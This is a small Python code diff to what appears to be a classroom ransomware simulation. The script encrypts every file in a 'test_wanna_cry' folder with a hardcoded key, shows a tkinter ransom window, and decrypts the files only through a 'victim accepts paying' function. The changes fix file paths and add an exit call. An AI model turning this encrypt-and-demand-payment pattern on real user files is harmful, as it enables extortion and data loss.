@@ -1,5 +1,7 @@
 import tkinter as tk
 import os
+import os.path
+import sys
 
 from ex_8 import encrypt, decrypt
 
@@ -9,9 +11,11 @@ code = '123456789'
 def victim_accept_paying():
     for f in os.listdir('./test_wanna_cry'):
         try:
-            decrypt(f, code, paid=True)
-        except Exception as ex:
+            fp = os.path.abspath('./test_wanna_cry/' + f)
+            decrypt(fp, code, paid=True)
+        except Exception:
             pass
+    sys.exit()
 
 
 def start_wanna_cry():
@@ -31,6 +35,7 @@ def start_wanna_cry():
 
 if __name__ == '__main__':
     for f in os.listdir('./test_wanna_cry'):
-        encrypt(f, code)
+        fp = os.path.abspath('./test_wanna_cry/' + f)
+        encrypt(fp, code)
 
     start_wanna_cry()
